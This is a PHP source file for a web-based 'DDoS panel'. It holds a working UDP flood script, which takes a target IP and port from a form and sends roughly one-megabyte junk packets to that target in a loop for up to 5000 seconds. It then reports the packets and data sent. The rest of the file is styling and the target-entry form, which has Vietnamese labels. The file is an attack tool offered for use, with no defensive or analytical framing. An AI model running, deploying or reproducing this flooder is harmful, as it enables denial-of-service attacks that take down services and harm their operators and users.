<?php 
    if(isset($_GET['ip']) && 
    isset($_GET['exTime']) && 
    isset($_GET['port']) && 
    isset($_GET['timeout']) && 
    isset($_GET['exTime']) && 
    $_GET['exTime'] != "" && 
    $_GET['port'] != "" && 
    $_GET['ip'] != "" && 
    $_GET['timeout'] != "" && 
    $_GET['exTime'] != ""
    ) 
    { 
       $IP=$_GET['ip']; 
       $port=$_GET['port']; 
       $executionTime = "5000"; 
       $noOfBytes = "999999"; 
       $data = ""; 
       $timeout = "5000"; 
       $packets = 0; 
       $counter = $noOfBytes; 
       $maxTime = time() + $executionTime;; 
       while($counter--) 
       { 
            $data .= "X"; 
       } 
       $data .= " I-47";  
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>"; 
         
       while(1) 
       { 
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout); 
            if($socket) 
            { 
                fwrite($socket , $data); 
                fclose($socket); 
                $packets++; 
            } 
            if(time() >= $maxTime) 
            { 
                break; 
            } 
        } 
        
        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />"; 
        echo "Total Number of Packets Sent : " . $packets . "<br />"; 
        echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />";  
        echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />"; 
    } 
    else
    { 
        ?> 
<?php
session_start();
require('config.php');
include('admin.php');
?>


<html><head>

		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Noname Ddos </title>
<style type="text/css">
html {
  background: #0A171B;
  background-image: url(images/background.png);
  background-size: 1px 2px;
  color: #A7FEFF;
  font-family: Menlo, Consolas, Monaco, "Lucida Console", monospace;
  font-size: 11px;
  line-height: 18px;
  direction: ltr;
  height: 100%;
  width: 100%;
}
canvas {
  width: 95% !important;
  max-width: 912px;
  height: auto !important;
}
body {
  padding: 0;
  margin: 0;
  direction: ltr;
  height: 100%;
  width: 100%;
}
a {
  border: 0;
  cursor: pointer;
  background: none;
  color: #91D9DA;
  -webkit-font-smoothing: antialiased;
  text-transform: uppercase;
  font-size: 12px;
  line-height: 15px;
  text-decoration: none;
  text-shadow: 0 0 6px #ABFEFF;
  -webkit-transition: color 200ms ease, -webkit-transform 0s ease;
  -moz-transition: color 200ms ease, -moz-transform 0s ease;
  -o-transition: color 200ms ease, -o-transform 0s ease;
}
canvas {
  width: 100%;
}
a:hover {
  color: white;
}
::-webkit-scrollbar {
  width: 7px;
  background: #0A171B;
}
::-webkit-scrollbar-track {
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 1);
}
::-webkit-scrollbar-thumb {
  -webkit-box-shadow: inset 0 0 6px rgba(0, 0, 0, 4);
}
.clear {
  float: none;
  clear: both;
}
.left {
  float: left;
}
.left {
  float: left;
}
.auto {
  margin: auto;
}
.content-page {
  display: none;
}
.page {
  padding: 10px;
}
.page a {
  margin-right: 15px;
}
.login-input {
  color: white;
  -webkit-font-smoothing: antialiased;
  background-color: rgba(0, 255, 252, 0.05);
  background-image: -webkit-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -moz-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -o-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  border: 1px solid #2ACBF3;
  -moz-border-radius: 5px;
  -webkit-border-radius: 5px;
  border-radius: 5px;
  -webkit-box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  -moz-box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  -webkit-transition: border 200ms ease, -webkit-transform 0s ease;
  -moz-transition: border 200ms ease, -moz-transform 0s ease;
  -o-transition: border 200ms ease, -o-transform 0s ease;
  outline: none;
  text-align: left;
  font-size: 15px;
  color: #fff;
  padding: 10px;
  width: 300px;
  font-family: Menlo, Consolas, Monaco, "Lucida Console", monospace;
}
#sidebar {
  float: left;
  width: 20%;
  height: 100%;
  background-color: rgba(0, 255, 252, 0.08);
  background-image: -webkit-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.08));
  background-image: -moz-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.08));
  background-image: -o-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.08));
  text-align: center;
  position: fixed;
}
#main {
  float: right;
  background: url("http://wallpoper.com/images/00/32/36/76/anonymous_00323676.jpg");
  width: 80%;
  border-left: 1px solid #2ACBF3;
  min-height: 100%;
  overflow: scroll;
}
#ping {
  float: right;
  width: 40%;
  font-size: 12px;
  h2 {
    font-size: 15px;
  }
}
.error {
  margin: initial;
  width: 376px;
  -webkit-font-smoothing: antialiased;
  text-transform: uppercase;
  font-size: 13px;
  text-align: center;
  margin-bottom: 20px;
  border: 1px solid #F44747;
  color: white;
  padding: 10px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -webkit-box-shadow: 0 0 16px rgba(244, 71, 71, 0.3), inset 0 0 20px rgba(244, 71, 71, 0.3);
  -moz-box-shadow: 0 0 16px rgba(244, 71, 71, 0.3), inset 0 0 20px rgba(244, 71, 71, 0.3);
  box-shadow: 0 0 16px rgba(244, 71, 71, 0.3), inset 0 0 20px rgba(244, 71, 71, 0.3);
}
.message {
  margin: initial;
  width: 376px;
  -webkit-font-smoothing: antialiased;
  text-transform: uppercase;
  font-size: 13px;
  text-align: center;
  margin-bottom: 20px;
  border: 1px solid #2AF16A;
  color: white;
  padding: 10px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -webkit-box-shadow: 0 0 16px green, inset 0 0 20px green;
  -moz-box-shadow: 0 0 16px green, inset 0 0 20px green;
  box-shadow: 0 0 16px green, inset 0 0 20px green;
}
#eix {
  color: #A7FEFF;
  -webkit-box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  -moz-box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  box-shadow: 0 0 16px rgba(0, 192, 255, 0.3), inset 0 0 20px rgba(0, 192, 255, 0.3);
  -webkit-transition: border 200ms ease, -webkit-transform 0s ease;
  -moz-transition: border 200ms ease, -moz-transform 0s ease;
  -o-transition: border 200ms ease, -o-transform 0s ease;
  border: 1px solid #2ACBF3;
  margin-top: 20px;
  width: 95%;
  background-color: rgba(0, 255, 252, 0.05);
  background-image: -webkit-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -moz-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -o-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  border: 1px solid #2ACBF3;
  -moz-border-radius: 5px;
  -webkit-border-radius: 5px;
  border-radius: 5px;
}
#eix tr td {
  padding: 5px;
}
#eix tr {
  font-size: 90%;
  background-color: rgba(0, 255, 252, 0.05);
  background-image: -webkit-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -moz-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  background-image: -o-linear-gradient(rgba(0, 192, 255, 0.05), rgba(0, 192, 255, 0), rgba(0, 192, 255, 0.05));
  border-bottom: 1px solid #2ACBF3;
}
.tooltip {
  position: absolute;
  z-index: 1030;
  display: block;
  font-size: 13px;
  line-height: 1.4;
  opacity: 0;
  filter: alpha(opacity=0);
  visibility: visible;
}
.tooltip.in {
  opacity: 0.8;
  filter: alpha(opacity=80);
}
.tooltip.top {
  padding: 5px 0;
  margin-top: -3px;
}
.tooltip.right {
  padding: 0 5px;
  margin-left: 3px;
}
.tooltip.bottom {
  padding: 5px 0;
  margin-top: 3px;
}
.tooltip.left {
  padding: 0 5px;
  margin-left: -3px;
}
.tooltip-inner {
  max-width: 2000px;
  padding: 8px;
  color: #ffffff;
  text-align: center;
  text-decoration: none;
  background-color: #000000;
  -webkit-border-radius: 4px;
  -moz-border-radius: 4px;
  border-radius: 4px;
}
.tooltip-arrow {
  position: absolute;
  width: 0;
  height: 0;
  border-color: transparent;
  border-style: solid;
}
.tooltip.top .tooltip-arrow {
  bottom: 0;
  left: 50%;
  margin-left: -5px;
  border-top-color: #000000;
  border-width: 5px 5px 0;
}
.tooltip.right .tooltip-arrow {
  top: 50%;
  left: 0;
  margin-top: -5px;
  border-right-color: #000000;
  border-width: 5px 5px 5px 0;
}
.tooltip.left .tooltip-arrow {
  top: 50%;
  right: 0;
  margin-top: -5px;
  border-left-color: #000000;
  border-width: 5px 0 5px 5px;
}
.tooltip.bottom .tooltip-arrow {
  top: 0;
  left: 50%;
  margin-left: -5px;
  border-bottom-color: #000000;
  border-width: 0 5px 5px;
}
hr {
  display: block;
  height: 1px;
  border: 0;
  border-top: 1px solid #ccc;
  margin: 1em 0;
  padding: 0;
}
#comments h1 {
  display: inline-block;
  padding-bottom: 25px
}
.commentCount {
  display: inline-block;
  vertical-align: baseline;
  font-size: 10px
}
#comments ol {
  list-style: none;
  list-style-type: none;
  margin: 0;
  padding: 0
}
.commentInfo, .commentDateStamp {
  display: inline-block;
  vertical-align: top;
  margin: 0;
  padding: 0;
  line-height: 18px;
  width: 140px
}
.commentDateStamp {
  font-size: 10px
}
.comment {
  position: relative;
  display: inline-block;
  width: 65%;
  vertical-align: top;
  padding: 3px 10px;
  background: #1C2528;
  background-image: url(images/background.png);
  background-size: 1px 2px;
  margin-bottom: 15px;
  margin-left: 0
}
.comment:after {
  content: "";
  position: absolute;
  top: 5px;
  left: -15px;
  border-style: solid;
  border-width: 10px 15px 10px 0;
  border-color: transparent #1C2528;
  display: block;
  width: 0;
  z-index: 1
}
.comment p {
  margin: 5px 0
}
li {
  list-style-type: none;
}
</style>
</head>
<body>

    
	<center><div class="content-page" style="display: block;"><h1>✪ Panel Ddos ✪</h1></center>
	<br>

                   
                           

</div>

                  <center>
               <form method="GET"> 
        
  
            <input type="hidden" name="dos" /> 
            <table id="margins"> 
                <tr> 
                    <td width="400" class="title"> 
                         
						 <b>Ip </b></font>
                    </td> 
                    <td> 
                        <input class="login-input" name="ip" value="127.0.0.1" onFocus="if(this.value == '127.0.0.1')this.value = '';" onBlur="if(this.value=='')this.value='127.0.0.1';"/> 
                    </td> 
                </tr> 
                  
                <tr> 
                    <td class="title"> 
                           <b>Port</b></font>
                    </td> 
                    <td> 
                        <input class="login-input" name="port" value="80" onFocus="if(this.value == '80')this.value = '';" onBlur="if(this.value=='')this.value='80';"/> 
                    </td> 
                </tr> 
                  
                <tr> 
                    <td class="title"> 
                          <b>Thời Gian DDos(giây)</b></font>
                    </td> 
                    <td> 
                        <input type="text" class="login-input" name="timeout" value="5" onFocus="if(this.value == '50')this.value = '';" onBlur="if(this.value=='')this.value='5';" /> 
                    </td> 
                </tr> 
                  
                  
                <tr> 
                    <td class="title"> 
                           <b>Số Bot</b></font>
                    </td> 
                    <td> 
                        <input type="text" class="login-input" name="exTime" value="10" onFocus="if(this.value == '10')this.value = '';" onBlur="if(this.value=='')this.value='10';"/> 
                    </td> 
                </tr> 
                  
                <tr> 
                    <td class="title"> 
                            <b>Số Packet</b></font>
                    </td> 
                    <td> 
                        <input type="text" class="login-input" name="noOfBytes" value="999999" onFocus="if(this.value == '999999')this.value = '';" onBlur="if(this.value=='')this.value='999999';"/> 
                    </td> 
                </tr> 
                  
  
                <tr> 
                    <td rowspan="2"> 
                        <input  type="submit" class="login-input" value="              DDos "/> 
                    </td> 
                </tr> 
            </table>             
        </form> 
            </center>
               


<script>
    $(".content-page").fadeIn(350);
    </script>
    
    </div></body></html> 
        <?php 
    } 
?>